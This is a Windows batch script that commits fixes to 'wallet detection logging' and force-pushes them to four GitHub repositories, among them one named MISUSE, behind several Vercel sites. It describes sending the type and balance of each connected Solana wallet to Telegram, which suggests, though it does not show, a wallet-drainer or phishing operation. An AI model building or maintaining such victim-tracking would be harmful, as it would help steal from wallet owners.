@echo off
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Fixing duplicate wallet type logging...
echo.
echo Issues found:
echo - Frontend and backend were both calling logWalletDetected
echo - Frontend call had wallet type but no balance (lamports: 0)
echo - Backend call had balance but potentially wrong wallet type
echo - Two messages were being sent to Telegram
echo.
echo Fixes applied:
echo - Removed duplicate logWalletDetected call from backend
echo - Updated frontend to pass actual balance to wallet logging
echo - Added balance update after successful balance fetch
echo - Now only one wallet detection message with correct type and balance
echo.
echo Committing duplicate logging fixes...
git add .
git commit -m "FIX: Duplicate wallet type logging - removed backend duplicate, frontend now passes balance"
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Pushing duplicate logging fixes to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo Done! Duplicate logging fixes pushed to all repositories.
echo.
echo Summary:
echo - Only one wallet detection message per wallet connection
echo - Frontend passes wallet type and balance correctly
echo - Backend no longer duplicates wallet detection logging
echo - Wallet type should now show correctly in Telegram
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo.
echo Test all wallet types:
echo 1. Phantom - should show "Type: Phantom" with correct balance
echo 2. Solflare - should show "Type: Solflare" with correct balance
echo 3. Backpack - should show "Type: Backpack" with correct balance
echo 4. Glow - should show "Type: Glow" with correct balance
echo 5. Trust Wallet - should show "Type: Trust Wallet" with correct balance
echo 6. Exodus - should show "Type: Exodus" with correct balance
echo.
echo The wallet type should now show correctly with the actual balance!
pause
